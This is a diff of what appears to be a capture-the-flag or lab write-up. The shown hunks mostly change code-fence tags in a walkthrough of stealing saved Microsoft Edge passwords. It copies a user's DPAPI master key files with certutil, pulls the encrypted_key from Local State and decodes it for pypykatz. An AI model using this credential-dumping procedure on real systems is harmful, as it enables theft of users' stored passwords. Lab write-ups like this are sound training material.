@@ -1,4 +1,4 @@
-This writeup is so bad. :( I'll fix it later probs
+This writeup is so bad. :( I'll fix it later probs.
 # Enumeration
 ## Nmap
 ```bash
@@ -304,7 +304,7 @@ S-1-5-21-1844305427-4058123335-2739572863-2761
 ```
 
 Dump some files.
-```
+```powershell
 Directory: C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761
 
 
@@ -316,14 +316,14 @@ Mode                 LastWriteTime         Length Name
 ```
 
 Convert the files to b64.
-```
+```powershell
 certutil -encode 3ebf1d50-8f5c-4a75-9203-20347331bad8 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64
 ```
 
 Then decode on linux host.
 
 So these are the dpapi keys.
-```
+```powershell
 Directory: C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default
 
 
@@ -342,14 +342,14 @@ Mode                 LastWriteTime         Length Name
 Useful :)
 
 There is an encrypted_key in the Local State json dump which encrypts the passwords in the Login Data db, but is encrypted with dpapi.
-```
+```json
 "encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAJEL2orPLKQ5JmjgKfUD4REAAAAAoAAABFAGQAZwBlAAAAA2YAAMAAAAAQAAAAERo760RqlJ/1NQi4Mzu/ZgAAAAAEgAAAoAAAABAAAAAWAlikfH8o+jE6a5gX3L2aKAAAACAUAaTmAnujTfLRzhFqjgv7O9AUtBxQzQK2W+gZfUU0M8NHuoRD4a4UAAAAjFmocvQLwq3PeEzWRbAz1o7pQWM="
 ```
 
 Going to use pypykatz (import with pip)
 
 debase64 the key:
-```
+```bash
 echo 'RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAJEL2orPLKQ5JmjgKfUD4REAAAAAoAAABFAGQAZwBlAAAAA2YAAMAAAAAQAAAAERo760RqlJ/1NQi4Mzu/ZgAAAAAEgAAAoAAAABAAAAAWAlikfH8o+jE6a5gX3L2aKAAAACAUAaTmAnujTfLRzhFqjgv7O9AUtBxQzQK2W+gZfUU0M8NHuoRD4a4UAAAAjFmocvQLwq3PeEzWRbAz1o7pQWM='|base64 -d | cut -c6- > dpapi_blob
 ```
 
